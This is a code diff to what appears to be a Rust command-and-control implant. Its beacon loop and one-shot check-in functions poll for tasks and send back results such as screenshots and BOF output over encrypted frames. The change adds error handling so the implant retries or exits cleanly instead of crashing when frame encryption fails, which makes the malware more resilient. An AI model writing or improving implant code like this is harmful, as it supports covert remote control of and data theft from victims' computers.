@@ -157,7 +157,19 @@ pub unsafe fn beacon_loop() {
     let mut counter = 0u64;
     let mut attempts = 0u32;
     loop {
-        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
+        // Seal failure (AEAD alloc failure — infallible in practice) is now a
+        // Result. Under panic=abort the pre-fix path would have torn the
+        // process down; instead we retry the next iteration after a sleep.
+        let frame = match encode_frame(&pubkey, counter, &key, &info_plain) {
+            Ok(f) => f,
+            Err(_) => {
+                sleep_jitter(
+                    SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed),
+                    cfg.jitter_pct,
+                );
+                continue;
+            }
+        };
         counter += 1;
         crate::entry::diag_mark(b"L2_checkin_send");
         let resp = unsafe {
@@ -237,7 +249,12 @@ pub unsafe fn beacon_loop() {
         // P0-4: encode_batch replaces any oversized Response with an Err so the
         // frame always encodes instead of aborting the beacon when a screenshot
         // BMP or BOF output exceeds MAX_BLOB_LEN.
-        let frame = encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending));
+        // Seal failure → drop the batch this cycle and retry next cycle (the
+        // responses stay in `pending` because we only clear on success below).
+        let frame = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending)) {
+            Ok(f) => f,
+            Err(_) => continue,
+        };
         counter += 1;
         pending.clear();
 
@@ -284,7 +301,14 @@ pub unsafe fn beacon_loop() {
                     // (screenshot BMP / BOF output) exceeds MAX_BLOB_LEN —
                     // encode_batch swaps oversized responses for Err so the
                     // batch always encodes instead of aborting the beacon.
-                    let frame = encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending));
+                    let frame = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending))
+                    {
+                        Ok(f) => f,
+                        // Seal failure: keep `pending` (do not advance counter)
+                        // so the responses are retried next cycle instead of
+                        // being dropped AND the counter desyncing from server.
+                        Err(_) => continue,
+                    };
                     let sent = unsafe {
                         crate::channels::dispatch_send_recv(
                             &ch_ctx,
@@ -381,7 +405,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
     let mut counter = 0u64;
     let mut checked_in = false;
     for _ in 0..10 {
-        let frame = encode_frame(&pubkey, counter, &key, &info_plain);
+        let frame = match encode_frame(&pubkey, counter, &key, &info_plain) {
+            Ok(f) => f,
+            Err(_) => {
+                crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_CHECKIN");
+                return 0xC3; // check-in frame seal failed (AEAD alloc failure)
+            }
+        };
         counter += 1;
         crate::entry::diag_mark(b"b6_send");
         if unsafe {
@@ -413,12 +443,18 @@ pub unsafe fn beacon_oneshot() -> u32 {
         // POST empty batch, receive any queued tasks. An empty batch has no
         // blobs, so encode_vec cannot hit MAX_BLOB_LEN — but use unwrap_or_default
         // so a malformed Writer state never aborts the beacon (P0-4).
-        let frame = encode_frame(
+        let frame = match encode_frame(
             &pubkey,
             counter,
             &key,
             &TaskResponse::encode_vec(&[]).unwrap_or_default(),
-        );
+        ) {
+            Ok(f) => f,
+            Err(_) => {
+                crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_POLL");
+                return 0xC3; // poll frame seal failed (AEAD alloc failure)
+            }
+        };
         counter += 1;
         crate::entry::diag_mark(b"b8_poll");
         let body = unsafe {
@@ -461,7 +497,17 @@ pub unsafe fn beacon_oneshot() -> u32 {
         if !pending.is_empty() {
             // P0-4: encode_batch swaps any oversized Response for an Err so the
             // frame always encodes instead of aborting the beacon.
-            let rframe = encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending));
+            let rframe = match encode_frame(&pubkey, counter, &key, &encode_batch(&mut pending))
+            {
+                Ok(f) => f,
+                Err(_) => {
+                    crate::entry::diag_mark(b"ERR_ONESHOT_SEAL_FLUSH");
+                    // Keep `pending` (do not advance counter) so the responses
+                    // are retried — but oneshot exits after this cycle, so just
+                    // break out of the response loop.
+                    break;
+                }
+            };
             let sent = unsafe {
                 crate::channels::dispatch_send_recv(
                     &ch_ctx,
